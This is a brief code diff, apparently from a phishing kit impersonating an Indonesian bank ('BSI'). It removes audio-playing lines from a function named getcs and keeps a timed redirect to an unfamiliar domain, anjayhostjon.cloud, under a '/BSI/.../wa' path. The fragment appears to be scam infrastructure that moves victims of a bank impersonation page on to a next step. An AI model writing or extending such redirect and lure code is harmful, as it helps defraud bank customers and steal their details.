@@ -153,12 +153,7 @@ document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
 // datawa
 
 function getcs(){
- $("#djload").show();   
-  audio4 = document.getElementById("bsiku");
-  audio1 = document.getElementById("bsi");
-    audio4.play();
-     audio1.load();
-    audio4.loop = false
+ $("#djload").show();     
 setTimeout(function(){  
 location.href='https://anjayhostjon.cloud/BSI/v8gf1/wa';
     }, 1000);
